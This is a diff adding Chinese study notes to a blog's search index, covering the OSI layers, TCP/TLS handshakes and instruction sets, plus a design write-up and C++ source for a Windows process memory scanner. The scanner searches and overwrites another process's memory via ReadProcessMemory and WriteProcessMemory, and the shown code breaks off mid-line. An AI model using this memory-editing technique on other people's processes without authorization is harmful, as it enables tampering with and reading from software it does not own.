@@ -1,6 +1,516 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>OSI模型</title>
+    <url>/2020/08/02/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/OSI%E6%A8%A1%E5%9E%8B/</url>
+    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
+<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
+<p>能产生数据流量的并且能与用户交互的程序</p>
+<p>记事本不是，因为不能产生数据流量</p>
+<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
+<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
+<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
+<p>对话控制（记录该由谁来发送数据）</p>
+<p>令牌管理（禁止双方同时执行同一关键操作）</p>
+<p>同步功能（设置断点，崩溃恢复）</p>
+<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
+<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
+<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
+<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
+<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
+<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
+<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
+<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
+<p><img src="/2020/08/02/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
+]]></content>
+      <categories>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>计算机网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TCP&amp;IP</title>
+    <url>/2021/03/14/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/TCP&amp;IP/</url>
+    <content><![CDATA[<h2 id="TCP"><a class="header-anchor" href="#TCP"></a>TCP</h2>
+<h3 id="三次握手和四次挥手"><a class="header-anchor" href="#三次握手和四次挥手"></a>三次握手和四次挥手</h3>
+<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
+<ul>
+<li>
+<p>三次握手</p>
+<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
+<p><img src="/2021/03/14/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
+<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
+<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
+<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
+<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
+<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
+</li>
+<li>
+<p>四次挥手</p>
+<img src="/2021/03/14/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
+<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
+<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
+</li>
+</ul>
+<h3 id="TCP-UDP"><a class="header-anchor" href="#TCP-UDP"></a>TCP/UDP</h3>
+<p>有连接/无连接（可靠/不可靠）</p>
+<p>有拆分合并/无拆分合并</p>
+<p>有拥塞控制/无拥塞控制（发送速率的调整）</p>
+<p>单播/多播</p>
+<h3 id="滑动窗口和流量控制"><a class="header-anchor" href="#滑动窗口和流量控制"></a>滑动窗口和流量控制</h3>
+<h3 id="拥塞控制"><a class="header-anchor" href="#拥塞控制"></a>拥塞控制</h3>
+<h2 id="http-https"><a class="header-anchor" href="#http-https"></a>http/https</h2>
+<h3 id="http各版本区别"><a class="header-anchor" href="#http各版本区别"></a>http各版本区别</h3>
+<p>http1.0 vs http1.1</p>
+<p>http1.1开始，默认使用长连接（HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。）</p>
+<p>http1.1增加了一些错误状态码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
+<h3 id="SSL-TLS"><a class="header-anchor" href="#SSL-TLS"></a>SSL/TLS</h3>
+<ul>
+<li>首先由客户端发送Client Hello 消息到服务器，消息中主要包含了客户端支持的<code>ciphersuites</code>， TLS 版本信息和客户端随机数。<strong>注意此时是明文传输</strong></li>
+<li>服务器接收到消息后，返回自己支持的<code>ciphersuites</code>， TLS 版本，<strong>自己的数字证书</strong>和服务器端生成的随机数。<strong>注意此时是明文传输</strong></li>
+<li>客户端开始验证数字证书，可能会不断往上追溯 CA、CA 的 CA、CA 的 CA 的 CA，直到一个受信的 CA。验证完证书之后生成一个新的<code>pre-master key</code>，再使用证书中的公钥来对<code>pre-master key</code>进行加密，然后发送给服务器。<strong>注意此时是非对称加密传输</strong></li>
+<li>服务器接收到客户端发送过来的非对称加密的密文，使用自己的私钥进行解密，获得了<code>pre-master key</code>。<strong>注意此时是非对称加密传输</strong></li>
+<li>到这里为止，服务器和客户端都有三组数字，**分别是客户端的随机数、服务器的随机数和pre-master key。**其中由于客户端的随机数和服务器的随机数都是使用明文传输，所以这两个数字是有被暴露的风险的，但是由于<code>pre-master key</code>是使用非对称加密传输，十分安全，所以将这三者结合，使用之前协商好的特定的算法就可以生成一个密钥，这个密钥称为<code>shared secert</code>。也就是之后用来对称加密的密钥。</li>
+<li>客户端在计算出对称加密的密钥之后，使用该密钥进行对称加密通信，告知服务器之后都使用该密钥进行对称加密。<strong>注意此时是对称加密传输</strong></li>
+<li>服务器接收到密文后，使用之前计算出的密钥来进行对称解密，解密成功之后，再使用该密钥进行对称加密通信。告知客户端密钥确认无误，可以使用该密钥进行通信。<strong>注意此时是对称加密传输</strong></li>
+<li>至此，整个TLS的握手过程完整，之后就可以开始对称加密的通信了。</li>
+</ul>
+<h2 id="参考文章"><a class="header-anchor" href="#参考文章"></a>参考文章</h2>
+<ul>
+<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>计算机网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>指令集和操作系统位数</title>
+    <url>/2020/06/10/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
+<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
+<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
+<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
+<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
+<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
+<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
+<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
+<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
+]]></content>
+      <categories>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>操作系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows内存扫描器的设计和实现</title>
+    <url>/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/</url>
+    <content><![CDATA[<h1>1、程序目标</h1>
+<ol>
+<li>利用Windows系统提供的接口读取内存数据；</li>
+<li>对获取的数据进行分析，包括内存结构、进程链表、页目录表结构和进程信息；</li>
+<li>实现物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；</li>
+<li>实现物理内存数据修改功能，并展示内存数据修改后的结果；</li>
+</ol>
+<h1>2、总体设计</h1>
+<p>程序预期包含四个功能，每个功能由一个程序模块实现。如下图，程序运行时首先调用<code>getSystemInfo</code>函数获取系统及内存基本信息，再执行<code>getProcessInfo</code>函数获取当前正在运行的所有进程及其对应pid，用户输入进程pid选择要扫描的进程后，调用<code>getMemoryBlock</code>扫描该进程使用的内存，逐一打印内存块信息（起始地址、内存块大小、内存块状态、访问权限等），打印完成后用户选择查询内存内容或者修改内存内容，这两个功能分别由<code>SearchProcessMemory</code>和<code>ModifyProcessMemory</code>实现。</p>
+<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps1.jpg" alt="img"></p>
+<h1>3、详细设计与实现</h1>
+<h2 id="3-1-数据结构设计"><a class="header-anchor" href="#3-1-数据结构设计"></a>3.1 数据结构设计</h2>
+<p>SYSTEM_INFO（操作系统信息）</p>
+<pre><code class="language-c++">typedef struct _SYSTEM_INFO {
+    __C89_NAMELESS union {
+      DWORD dwOemId;
+      __C89_NAMELESS struct {
+  WORD wProcessorArchitecture;
+  WORD wReserved;
+      } DUMMYSTRUCTNAME;
+    } DUMMYUNIONNAME;
+    DWORD dwPageSize;					//页面大小
+    LPVOID lpMinimumApplicationAddress;	//进程用户区起始地址
+    LPVOID lpMaximumApplicationAddress;	//进程用户区上界
+    DWORD_PTR dwActiveProcessorMask;
+    DWORD dwNumberOfProcessors;
+    DWORD dwProcessorType;
+    DWORD dwAllocationGranularity;
+    WORD wProcessorLevel;
+    WORD wProcessorRevision;
+  } SYSTEM_INFO;
+</code></pre>
+<p>MEMORYSTATUS（内存统计信息）</p>
+<pre><code class="language-c++">typedef struct _MEMORYSTATUS {
+    DWORD dwLength;			//MEMORYSTATUS结构的大小
+    DWORD dwMemoryLoad;		//物理内存使用率
+    SIZE_T dwTotalPhys;		//总物理内存
+    SIZE_T dwAvailPhys;		//可用物理内存
+    SIZE_T dwTotalPageFile;	//总页面文件大小
+    SIZE_T dwAvailPageFile;	//可用页面文件大小
+    SIZE_T dwTotalVirtual;	//总虚拟内存
+    SIZE_T dwAvailVirtual;	//可用虚拟内存
+  } MEMORYSTATUS
+</code></pre>
+<p>PROCESSENTRY32（进程快照信息），用于获取正在运行的所有进程的信息</p>
+<pre><code class="language-c++">typedef struct tagPROCESSENTRY32
+{
+    DWORD dwSize;	//结构体大小
+    DWORD cntUsage;	
+    DWORD th32ProcessID;	//进程ID
+    ULONG_PTR th32DefaultHeapID;
+    DWORD th32ModuleID;
+    DWORD cntThreads;	//线程数
+    DWORD th32ParentProcessID;
+    LONG pcPriClassBase;
+    DWORD dwFlags;
+    TCHAR szExeFile[MAX_PATH];	//进程名称
+} PROCESSENTRY32;
+</code></pre>
+<p>MEMORY_BASIC_INFORMATION32（内存块信息）</p>
+<pre><code class="language-c++">typedef struct _MEMORY_BASIC_INFORMATION32 {
+    //指向页面区域基地址的指针  
+    DWORD BaseAddress;	
+    //指向VirtualAlloc函数分配的页面范围的基地址的指针。BaseAddress成员指向的页面包含在此分配范围内
+    DWORD AllocationBase;
+    //最初分配区域时的内存保护选项。该成员可以是内存保护常量之一，如果调用者没有访问权限，则该成员可以为0
+    DWORD AllocationProtect;
+    //从所有页具有相同属性的基地址开始的区域大小
+    DWORD RegionSize;
+    //区域中页面的状态，有MEM_COMMIT、MEM_FREE、MEM_RESERVE三种可能
+    DWORD State;
+    //区域中页面的访问保护。该成员是为AllocationProtect成员列出的值之一。
+    DWORD Protect;
+    //区域中页面的类型，有MEM_IMAGE、MEM_MAPPED、MEM_PRIVATE三种可能
+    DWORD Type;
+} MEMORY_BASIC_INFORMATION32;
+</code></pre>
+<h2 id="3-2-程序模块设计"><a class="header-anchor" href="#3-2-程序模块设计"></a>3.2 程序模块设计</h2>
+<h3 id="getSystemInfo"><a class="header-anchor" href="#getSystemInfo"></a>getSystemInfo</h3>
+<p><code>GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)</code>、<code>GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)</code>两个Windows提供的API可以分别获取系统信息和系统内存信息，在该模块中只要调用两个API后再打印结构体信息即可。</p>
+<h3 id="getProcessInfo"><a class="header-anchor" href="#getProcessInfo"></a>getProcessInfo</h3>
+<p>首先调用<code>CreateToolhelp32Snapshot</code>函数获取进程列表快照的句柄，然后遍历进程快照，轮流显示每个进程的信息（PID、进程名、线程数等）。</p>
+<h3 id="getMemoryBlock"><a class="header-anchor" href="#getMemoryBlock"></a>getMemoryBlock</h3>
+<p>调用<code>OpenProcess()</code>获取想要访问的进程的句柄，循环调用<code>VirtualQueryEx()</code>函数，将返回的<code>MEMORY_BASIC_INFORMATION</code>数据结构保存到列表中，循环遍历列表，打印各个内存块的基本信息。</p>
+<h3 id="SearchProcessMemory"><a class="header-anchor" href="#SearchProcessMemory"></a>SearchProcessMemory</h3>
+<p>循环遍历存有内存块信息的列表MemList，选择状态为<code>MEM_COMMIT</code>的内存块（这些内存块中的数据值是有效的），再通过<code>ReadProcessMemory()</code>访问该内存区域，遍历该区域，将值为我们查找的内容的内存地址加入列表AddrList。最后将AddList中的地址打印出来。</p>
+<h3 id="ModifyProcessMemory"><a class="header-anchor" href="#ModifyProcessMemory"></a>ModifyProcessMemory</h3>
+<p>首先通过<code>OpenProcess()</code>获取进程句柄，需要注意的是，在打开进程时要选择获取所有控制权限，否则可能因为权限过低而无法进行内存的修改。<code>VirtualProtectEx()</code>修改内存块的保护模式，然后通过<code>WriteProcessMemory()</code>写入内存块具体位置的值，最后再次调用<code>VirtualProtectEx()</code>还原内存块的保护模式。</p>
+<h1>4、程序运行效果</h1>
+<blockquote>
+<p>运行环境：Windows 7 x64</p>
+</blockquote>
+<p>程序运行界面如图</p>
+<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps2.jpg" alt="img"></p>
+<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps3.jpg" alt="img"></p>
+<p>我们选择要打开的进程，以helloworld测试程序test.exe（PID为1500）为例（系统进程所需权限较高，会打开失败）：</p>
+<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps4.jpg" alt="img"></p>
+<p>可以看到，成功打开进程后，打印了进程使用的内存块信息，打印完成后选择要执行的功能。以下分别演示内存查询和内存修改。</p>
+<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps5.jpg" alt="img"></p>
+<p>可以查到存储的值为123456的内存地址有四个。接下来将其中一个的值修改为234567.</p>
+<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps6.jpg" alt="img"></p>
+<h1>5、源代码</h1>
+<p>readMemory.cpp</p>
+<pre><code class="language-c++">#include &quot;stdafx.h&quot;
+#include &lt;iostream&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tchar.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;string&gt;
+#include &lt;list&gt;
+#include &lt;iomanip&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;psapi.h&gt;
+
+#define MAX_ADDR_NUM 1024
+using namespace std;
+#pragma comment(lib,&quot;psapi.lib&quot;)
+DWORD dwProcessId[1024], cbNeededProcess;
+
+list&lt;MEMORY_BASIC_INFORMATION&gt;	MemList ;
+SYSTEM_INFO systemInfo;
+MEMORYSTATUS memstatus;
+list&lt;DWORD&gt; AddrList;
+
+void getSystemInfo();
+void getProcessInfo();
+bool getMemoryBlock(DWORD dwProcessId);
+bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue);
+bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue);
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	cout&lt;&lt;&quot;---------------系统及内存信息如下--------------&quot;&lt;&lt;endl;
+	getSystemInfo();
+
+	//获取当前进程信息
+	cout&lt;&lt;endl&lt;&lt;&quot;-----------------进程列表如下-----------------&quot;&lt;&lt;endl;
+	getProcessInfo();
+
+	DWORD pid;
+	while(TRUE){
+		pid=0;
+		cout&lt;&lt;&quot;输入你需要访问的进程PID号: &quot;;
+		cin&gt;&gt;pid;
+		if(!getMemoryBlock(pid)){
+			cout&lt;&lt;&quot;PID = &quot;&lt;&lt;(DWORD)pid&lt;&lt;&quot; 的进程打开失败!&quot;&lt;&lt;endl;
+		}else{
+			char c;
+			int mode = 0;
+			while(TRUE){
+				cout&lt;&lt;endl&lt;&lt;&quot;q: 返回&quot;&lt;&lt;endl&lt;&lt;&quot;s: 内存查询&quot;&lt;&lt;endl\
+                    &lt;&lt;&quot;m: 内存修改&quot;&lt;&lt;endl;
+				cout&lt;&lt;&quot;输入功能对应的字母:&quot;;
+				cin&gt;&gt;c;
+				if(c=='q'){
+					break;
+				}
+				else if(c=='s'){
+					DWORD x;
+					cout&lt;&lt;&quot;输入查询的值：&quot;;
+					cin&gt;&gt;x;
+					if(!SearchProcessMemory(pid,x)){
+						cout&lt;&lt;&quot;查询失败!&quot;&lt;&lt;endl;
+					}else{
+						if(AddrList.size()==0){
+							cout&lt;&lt;&quot;未查到值为 &quot;&lt;&lt;(DWORD)x\
+                                &lt;&lt;&quot; 的内存区域!&quot;&lt;&lt;endl;
+						}else{
+							cout&lt;&lt;&quot;共查到 &quot;&lt;&lt;AddrList.size()\
+                                &lt;&lt;&quot;个地址&quot;&lt;&lt;endl;
+							list&lt;DWORD&gt;::iterator it;
+							int i=0;
+							for(it=AddrList.begin();\
+                                it!=AddrList.end();it++){
+								printf(&quot;%d   0x%x \n&quot;,++i,(*it));
+							}
+						}
+					}
+				}
+				else if(c=='m'){
+					DWORD addr;
+					DWORD x;
+					cout&lt;&lt;&quot;要写入的内存地址(16进制)：&quot;&lt;&lt;endl;
+					cin&gt;&gt;hex&gt;&gt;addr;
+					// getchar();
+					cout&lt;&lt;&quot;要写入的值(10进制)：&quot;&lt;&lt;endl;
+					cin&gt;&gt;x;
+					if(ModifyProcessMemory(pid,(DWORD)addr,(DWORD)x)){
+						cout&lt;&lt;&quot;修改成功!&quot;&lt;&lt;endl;
+					}else{
+						cout&lt;&lt;&quot;修改失败!&quot;&lt;&lt;endl;
+					}
+				}
+			}
+		}
+		getProcessInfo();
+	}
+	return 0;
+}
+
+
+
+void getSystemInfo(){
+
+	GetSystemInfo(&amp;systemInfo);
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区上界:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMaximumApplicationAddress&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区起始:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMinimumApplicationAddress&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;页面大小:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.dwPageSize&lt;&lt;endl;
+
+
+	GlobalMemoryStatus(&amp;memstatus);
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;物理内存使用率:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwMemoryLoad&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;总物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPhys&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPhys&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;总页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPageFile&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPageFile&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;总虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalVirtual&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailVirtual&lt;&lt;endl;
+}
+
+
+void getProcessInfo(){
+	//为进程列表拍摄快照
+    HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+    if(hProcessSnap==INVALID_HANDLE_VALUE){
+        printf(&quot;CreateToolhelp32Snapshot调用失败!\n&quot;);
+        exit(0);
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    //遍历进程快照。轮流显示每个进程的信息
+    BOOL bMore=Process32First(hProcessSnap,&amp;pe32);
+    int i=0;
+    printf(&quot;PID\t线程数\t进程名称\n&quot;);
+    while(bMore){
+
+        bMore=Process32Next(hProcessSnap,&amp;pe32);
+        _tprintf(_T(&quot;%u\t&quot;),pe32.th32ProcessID);
+        _tprintf(_T(&quot;%u\t&quot;),pe32.cntThreads);
+        _tprintf(_T(&quot;%s\n&quot;),pe32.szExeFile);
+
+        i++;
+    }
+    //清除snapshot对象
+    CloseHandle(hProcessSnap);
+    printf(&quot;进程总数:%d\n&quot;,i);
+}
+
+
+bool getMemoryBlock(DWORD dwProcessId){
+	MemList.clear();
+	HANDLE hProcess =INVALID_HANDLE_VALUE;
+	if(dwProcessId != GetCurrentProcessId()){
+		hProcess = OpenProcess( PROCESS_QUERY_INFORMATION|\
+                               PROCESS_VM_READ,FALSE , dwProcessId);
+	}
+	if(hProcess == NULL){
+		return FALSE;
+	}
+	MEMORY_BASIC_INFORMATION  MemBaseInfo;
+	DWORD  dwInfoSize = sizeof(MEMORY_BASIC_INFORMATION);
+	DWORD  dwCurPos = (DWORD)systemInfo.lpMinimumApplicationAddress;
+	while(dwCurPos &lt; (DWORD) systemInfo.lpMaximumApplicationAddress ){
+		VirtualQueryEx( hProcess,(LPVOID)dwCurPos , &amp;MemBaseInfo,dwInfoSize);
+		MemList.push_back(MemBaseInfo);
+		dwCurPos = (DWORD) MemBaseInfo.BaseAddress + MemBaseInfo.RegionSize ;
+	}
+	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it = MemList.begin();
+	int num=0;
+	dwCurPos = (DWORD)(*it).BaseAddress;
+	for( ;it != MemList.end(); it++){
+		cout&lt;&lt;dec&lt;&lt;&quot;---- &quot;&lt;&lt;++num&lt;&lt;&quot; ----&quot;&lt;&lt;endl;
+		cout&lt;&lt;&quot;内存块基址: 0x&quot;&lt;&lt;hex&lt;&lt;dwCurPos&lt;&lt;endl;
+		cout&lt;&lt;&quot;保护方式：&quot;&lt;&lt;(*it).AllocationProtect&lt;&lt;endl;
+		cout&lt;&lt;&quot;区域大小：&quot;&lt;&lt;(*it).RegionSize&lt;&lt;endl;
+		cout&lt;&lt;&quot;状态：&quot;;
+		if((*it).State == MEM_COMMIT){
+			cout&lt;&lt;&quot;提交&quot;&lt;&lt;endl;
+		}else if((*it).State == MEM_FREE){
+			cout&lt;&lt;&quot;空闲&quot;&lt;&lt;endl;
+		}else if((*it).State == MEM_RESERVE){
+			cout&lt;&lt;&quot;保留&quot;&lt;&lt;endl;
+		}else{}
+		cout&lt;&lt;&quot;访问保护方式：&quot;;
+		if((*it).Protect == PAGE_READONLY){
+			cout&lt;&lt;&quot;只读&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_READWRITE ){
+			cout&lt;&lt;&quot;读/写&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_EXECUTE){
+			cout&lt;&lt;&quot;可执行&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_EXECUTE_READ){
+			cout&lt;&lt;&quot;可执行/读&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_EXECUTE_READWRITE){
+			cout&lt;&lt;&quot;可执行/读写&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_NOACCESS){
+			cout&lt;&lt;&quot;不允许存储&quot;&lt;&lt;endl;
+		}
+		cout&lt;&lt;&quot;类型：&quot;;
+		if((*it).Type == MEM_IMAGE){
+			cout&lt;&lt;&quot;映像&quot;&lt;&lt;endl;
+		}else if((*it).Type == MEM_MAPPED){
+			cout&lt;&lt;&quot;映射&quot;&lt;&lt;endl;
+		}else if((*it).Type == MEM_PRIVATE){
+			cout&lt;&lt;&quot;私有&quot;&lt;&lt;endl;
+		}else{}
+		dwCurPos+=(*it).RegionSize ;
+	}
+	return true;
+}
+
+
+bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue){
+	AddrList.clear();
+	if(MemList.empty()){
+		return false;
+	}
+	HANDLE hProcess = INVALID_HANDLE_VALUE;
+	if(dwProcessId !=GetCurrentProcessId()){
+		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,\
+                               FALSE,dwProcessId);
+		if(hProcess ==NULL)
+			return false;
+	}
+	LPBYTE lpBuff = new BYTE[systemInfo.dwPageSize];
+	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it;
+	for(it=MemList.begin();it!=MemList.end();it++){
+		if(it-&gt;State != MEM_COMMIT){
+			continue;
+		}
+		DWORD dwSize =0;
+		SIZE_T dwReadBytes=0;
+		while(dwSize &lt; it-&gt;RegionSize){
+			LPVOID lpAddr = (LPVOID)((DWORD)it-&gt;BaseAddress+dwSize);
+            if(ReadProcessMemory(hProcess,lpAddr,lpBuff,\
